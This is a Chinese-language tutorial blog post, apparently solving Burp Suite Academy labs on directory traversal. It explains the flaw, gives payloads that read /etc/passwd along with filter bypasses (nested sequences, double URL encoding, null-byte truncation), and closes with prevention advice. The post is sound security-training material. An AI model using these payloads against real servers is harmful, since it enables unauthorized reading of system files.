---
layout: post
title: "Burpsuite Academy系列教程-Directory traversal"
date:   2021/8/24
tags: [Burpsuite Academy系列教程]
comments: true
author: c-uncle
---

# Directory traversal

目录遍历漏洞，通常是由于服务器配置错误或代码层错误导致。攻击者可以利用该漏洞实现跨目录查看文件。



## Reading arbitrary files via directory traversal

通过目录遍历读取任意文件。

假设有一个购物网站，该网站在展示商品图片时使用了像下面一样的HTML标签。

```
<img src="/loadImage?filename=218.png">
```

我们可以得知，站点的/loadImage功能会根据参数filename获取对应的图片，如果攻击者可以控制filename，那么就有可能实现一个任意文件读取。

如果站点存放图片的路径为/var/www/images/，那么攻击者可以构造如下payload来进行攻击。

```
payload
/loadImage?filename=../../../etc/passwd
```

../表示当前文件夹的上一层文件夹，例如，当前路径为/var/www/images，此时../表示的就是/var/www/。多个../是有叠加效果的。对于/var/www/images/，三个../表示根目录/。

对于根目录来说，/的../依旧是/。也就是说，如果我们不知道绝对路径，依旧能够利用../来实现目录遍历，只要添加足够多的../

#### Lab: File path traversal, simple case

目标：利用目录遍历漏洞获取/etc/passwd的内容

```
payload
image?filename=../../../etc/passwd
```

如果是在浏览器里执行这个payload，那么就把图片保存下来，用记事本打开就行了。



## Common obstacles to exploiting file path traversal vulnerabilities

下面几个lab将讲解绕过目录遍历检测的方法。

#### Lab: File path traversal, traversal sequences blocked with absolute path bypass

场景：应用程序禁止目录遍历序列，也就是禁止../，但是将用户提供的文件名视为相对于默认工作目录。

目标：获取/etc/passwd

```
payload
image?filename=/etc/passwd
```

#### Lab: File path traversal, traversal sequences stripped non-recursively

场景：应用程序去除文件名参数中的路径遍历序列，也就是去除../

目标：获取/etc/passwd

```
payload
image?filename=..././..././..././etc/passwd
```

尝试image?filename=../62.jpg，页面显示正常，我怀疑应用程序是将../过滤了，因此这里采用双写../来绕过。

#### Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

目标：获取/etc/passwd

场景：应用程序在使用用户提交的参数前会对参数进行解码操作。

```
payload
image?filename=..%252F..%252F..%252Fetc%252Fpasswd
未编码前的payload
image?filename=../../../etc/passwd
```

我先尝试对payload进行了一次编码，未能通过，猜想对参数的过滤应该也是解码后进行的，因此尝试二次编码，成功绕过。

#### Lab: File path traversal, validation of start of path

场景：应用程序要求用户提交的参数是绝对路径，并且要以/var/www/images/开头。

目标：获取/etc/passwd

```
payload
image?filename=/var/www/images/../../../etc/passwd
```

由于一定要以/var/www/images/作为路径开头，那么我们可以利用../来进行目录遍历

#### Lab: File path traversal, validation of file extension with null byte bypass

场景：应用程序会对用户提交的文件名参数进行后缀验证，确保用户访问的文件合法。

目标：获取/etc/passwd

```
payload
image?filename=../../../etc/passwd%00.jpg
```

利用%00截断来绕过后缀检测。



# How to prevent a directory traversal attack

防止目录遍历最有效的方法是避免用户提交的参数交付给系统API处理。如果非要这么做，可以从下面两个方面来预防。

1. 设置白名单，验证用户输入是否合法
2. 验证后，在调用系统API处理用户输入后，检查一下处理后的路径是否合法。这里指的是../被系统处理后真正的路径。